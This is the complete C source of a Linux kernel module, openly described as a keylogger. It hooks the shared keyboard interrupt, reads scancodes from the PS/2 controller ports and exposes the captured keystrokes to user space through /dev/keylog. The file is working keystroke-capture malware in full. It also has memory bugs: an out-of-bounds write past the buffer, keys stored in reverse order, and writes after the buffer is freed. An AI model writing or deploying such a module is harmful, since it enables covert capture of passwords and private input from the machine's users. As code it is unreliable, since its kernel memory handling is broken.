#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/interrupt.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include <linux/wait.h>
#include <linux/sched.h>
#include <linux/completion.h>

static int irq = 1;
module_param(irq, int, 0644);
char *kbuf;	/* Buffer for key strokes */
int keys = 0;  /* How many key strokes the userspace program wants*/

struct my_device {
        int data_port;
        int status_port;
} device;

/* Enumeration of DATA status */
enum intr_cause {
        NO_EVENT,
        INCOMING_DATA,
        OUT_OF_BAND
};

/* The rmmod can be sent asynchronously, while the read is happening.
 * We wait for completion of read call when rmmod is called. This is achieved by
 * using a completion structure. 
 */
DECLARE_COMPLETION(kbd_complete);
/* Wait queue on which the task waits while sufficient keys are logged */
DECLARE_WAIT_QUEUE_HEAD(key_wait);
int intr_registered  = 0; /* Check flag: whether intr is being handled  Used in
			   * case the file was never opened and we want to rmmod*/


static int testirq_read_intr_cause_register(struct my_device *device)
{
            return INCOMING_DATA;

}

irqreturn_t testirq_handler(int irq, void *d)
{
        int intr_cause = 0;

        unsigned char status;
        unsigned char scancode;

        struct my_device *device = (struct my_device *)d;
        pr_notice("Got interrupt on IRQ %d\n", irq);
        /* check the interrupt cause register of the hardware */
        intr_cause = testirq_read_intr_cause_register((struct my_device *)d);
        if (intr_cause == NO_EVENT) {
                return IRQ_NONE;
        } else if (intr_cause ==  INCOMING_DATA) {
                status = inb(device->status_port);
                scancode = inb(device->data_port);
                pr_notice("handler called for IRQ %d, status = %x\n", irq, status);
                pr_notice("Scan Code %x %s.\n", scancode & 0x7F,
                           scancode & 0x80 ? "Released" : "Pressed");

                if (kbuf) {
                        kbuf[keys--] = (char)scancode;
                        /* If we have got 10 keys, wake the read callback from wait queue
                         */
                        if (keys == 0)
                                wake_up_interruptible(&key_wait);
                }
                return IRQ_HANDLED;
        } else if (intr_cause == OUT_OF_BAND) {
                /* handle out-of-band events */
                 pr_notice("Got an out of band event.\n");
                 return IRQ_HANDLED;
        } else {
                pr_warn("Erraneous interrupt cause detected: %d\n", intr_cause);
                return IRQ_NONE;
        }

}


static int keylog_open(struct inode *inodep, struct file *filp) {

        int ret;
        pr_notice("Installing IRQ handler for %d\n", irq);
        device.status_port = 0x64;
        device.data_port = 0x60;

        ret = request_irq(irq,
                          testirq_handler,
                          IRQF_SHARED,
                          "testirq_handler",
                          (void *)&device);
        if (unlikely(ret)) {
                pr_err("failed to register interrupt handler\n");
        } else {
                pr_notice("interrupt handler registered.\n");
        }
	/* IRQ was registered, thus incremenet the count and initialize the
	 * completion structure
	 */
        intr_registered++;
        init_completion(&kbd_complete);
        return 0;
}

static int keylog_close(struct inode *inodep, struct file *filp) {
        pr_notice("Freeing interrupt handler on IRQ %d\n", irq);
        free_irq(irq, &device);
	/* IRQ is freed, thus decrement the count and mark the completion
	 * structure as complete.
	 */
        intr_registered--;
        complete(&kbd_complete);
        return 0;
}

static int keylog_read(struct file *f, char __user *buf,
                                    size_t len, loff_t *off)
{
        int ret;
        kbuf = (char *) kmalloc(len, GFP_KERNEL);
        keys = len;
        /* Wait on key_wait wait queue for the given condition, ie wait
         * for the number of reads the user wants.
         */
        ret = wait_event_interruptible(key_wait, (keys == 0));
        if (unlikely(ret))
                return ret; /* Interrupted by a signal */

        ret = copy_to_user(buf, kbuf, len);
        if (unlikely(ret)) {
                return -EFAULT; /*Segfault the userspace program*/
        }

        *off += len;
        kfree(kbuf);
        return len;
}

static struct file_operations keylog_fops = {
        open:     keylog_open,
        release:  keylog_close,
        read:     keylog_read,
};

static struct miscdevice keylog_dev = {
        MISC_DYNAMIC_MINOR,
        "keylog",
        &keylog_fops
};

static int __init keylog_driver_init(void)
{
        int ret = 0;
        ret = misc_register(&keylog_dev);
        if (unlikely(ret)) {
                pr_err("failed to register keylog device\n");
        } else {
                pr_notice("keylog device driver registered.\n");
        }
        return ret;
}

static void __exit keylog_driver_exit(void)
{
        /* If atleast one  interrupts is handled*/
        if (intr_registered)
		/* If interrupt is registered, wait for it to complete before
		 * removing the char device.
		 */
                wait_for_completion(&kbd_complete);
        misc_deregister(&keylog_dev);
        pr_notice("keylog device driver unregistered.\n");
}

module_init(keylog_driver_init);
module_exit(keylog_driver_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ritsz");
MODULE_DESCRIPTION("Keylogger written into /dev/keylog");
